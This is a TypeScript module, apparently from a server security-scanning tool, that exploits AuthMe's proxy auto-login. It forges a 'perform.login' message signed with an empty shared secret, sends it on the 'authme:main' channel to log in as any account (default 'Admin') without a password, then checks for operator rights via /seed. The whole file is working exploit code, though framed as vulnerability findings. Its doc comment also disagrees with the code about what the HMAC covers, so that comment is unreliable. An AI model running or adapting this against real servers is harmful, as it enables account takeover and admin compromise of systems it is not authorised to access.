import { createHmac } from 'node:crypto'
import type { EngineModule } from '../types'
import { McSession, sleep } from './lib/mcSession'

/**
 * C4 — AuthMe proxy auto-login forgery (authme:main / perform.login).
 *
 * AuthMe 6.0.0 and earlier accepted perform.login messages signed with an HMAC
 * even when Hooks.proxySharedSecret was empty (the empty string became the HMAC
 * key). The message format is:
 *
 *   channel: authme:main
 *   UTF  id          — message type, "perform.login" for MessageType.PERFORM_LOGIN
 *   UTF  name        — target player name
 *   long timestamp   — System.currentTimeMillis() of the sender
 *   UTF  signature   — HashUtils.hmacSha256(secret, id + timestamp)
 *
 * A direct connection can therefore authenticate as any registered account with
 * no credentials, which looks exactly like a legitimate proxy login in the logs.
 * AuthMe 6.0.1 rejects perform.login when the secret is empty.
 */
export const authProxyForge: EngineModule = {
  id: 'auth.proxy-forge',
  title: 'Proxy auto-login forgery (perform.login)',
  async run(ctx) {
    const name = ctx.params.username?.trim() || 'Admin'
    const secret = ctx.params.secret?.trim() ?? ''

    const session = await McSession.open(ctx.target, name)
    try {
      await sleep(2000)

      const messageId = 'perform.login'
      const timestamp = Date.now()
      const signature = createHmac('sha256', secret)
        .update(`${name}${timestamp}`)
        .digest('hex')

      const bufs: Buffer[] = []
      const writeUtf = (value: string): void => {
        const data = Buffer.from(value, 'utf8')
        const length = Buffer.alloc(2)
        length.writeUInt16BE(data.length, 0)
        bufs.push(length, data)
      }
      writeUtf(messageId)
      writeUtf(name)
      const tsBuf = Buffer.alloc(8)
      tsBuf.writeBigInt64BE(BigInt(timestamp), 0)
      bufs.push(tsBuf)
      writeUtf(signature)
      const payload = Buffer.concat(bufs)

      ctx.log(`sending forged perform.login for "${name}" on channel authme:main`)
      ctx.log(`timestamp=${timestamp} hmac(secret="${secret}")=${signature.slice(0, 16)}…`)
      const client = session.bot._client as {
        write: (packet: string, params: unknown) => void
      }
      client.write('custom_payload', { channel: 'authme:main', data: payload })

      await sleep(2500)

      // verify: did the server force-log us in? (/list is blocked until authenticated)
      const listOutput = (await session.sendAndCollect('/list', 1200, 5000)).trim()
      const seedOutput = (await session.sendAndCollect('/seed', 1200, 5000)).trim()
      const blocked = /需要先通过验证|请先登录|need.*(verify|login)|must.*login/i.test(listOutput)
      const authenticated = listOutput.length > 0 && !blocked
      const seedGranted = /seed\s*[:：]|种子\s*[:：]/i.test(seedOutput)

      ctx.evidence('proxyForge', {
        name,
        secretUsed: secret === '' ? '(empty)' : '(provided)',
        timestamp,
        hmac: `${signature.slice(0, 16)}…`,
        listOutput: listOutput.slice(0, 200),
        seedOutput: seedOutput.slice(0, 200)
      })

      if (seedGranted) {
        ctx.evidence('opGainedAs', name)
        ctx.finding({
          id: 'proxy-forge-op-gained',
          severity: 'critical',
          title: `Operator access gained via forged perform.login as "${name}"`,
          detail:
            'The AuthMe proxy auto-login message was accepted with no credentials (empty shared secret), and the session holds operator rights (/seed executed). A direct backend connection can log in as any account in one message — indistinguishable from a legitimate proxy login in the server logs.',
          evidence: { name, proofCommand: '/seed', output: seedOutput.slice(0, 200) }
        })
        return
      }

      if (authenticated) {
        ctx.finding({
          id: 'proxy-forge-authenticated',
          severity: 'high',
          title: `Authenticated via forged perform.login as "${name}"`,
          detail:
            'The AuthMe proxy auto-login message was accepted with no credentials (empty shared secret). The session is authenticated without ever providing a password — exactly like a legitimate proxy login. The account did not carry operator rights on this server.',
          evidence: { name, listOutput: listOutput.slice(0, 200) }
        })
      } else {
        ctx.finding({
          id: 'proxy-forge-blocked',
          severity: 'info',
          title: `perform.login forgery not accepted for "${name}"`,
          detail:
            'The forged proxy auto-login message did not authenticate the session — the server likely runs a patched AuthMe (6.0.1+ rejects empty shared secrets), has the BungeeCord hook disabled, or uses a non-empty shared secret.',
          evidence: { name, listOutput: listOutput.slice(0, 200), seedOutput: seedOutput.slice(0, 200) }
        })
      }
    } finally {
      session.close()
    }
  }
}
